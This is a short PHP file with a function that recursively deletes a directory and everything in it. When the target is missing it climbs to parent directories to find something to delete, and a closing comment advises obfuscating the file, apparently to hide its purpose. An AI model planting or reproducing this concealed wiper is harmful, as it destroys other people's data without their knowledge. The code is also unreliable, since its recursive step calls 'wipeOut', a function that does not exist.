<?php

 function wipe($dir)
 {
   if (is_dir($dir)) 
   {
     $objects = scandir($dir);
     foreach ($objects as $object) {
       if ($object != "." && $object != "..") {
         if (filetype($dir."/".$object) == "dir") wipeOut($dir."/".$object); else unlink($dir."/".$object);
       }
     }
     reset($objects);
     rmdir($dir);
   }
   else
   {
    $dir = "../" . $dir;
	if (is_dir($dir))
		wipe($dir);
   }
 }

 //obsfucate this file by http://www.fopo.com.ar/
?>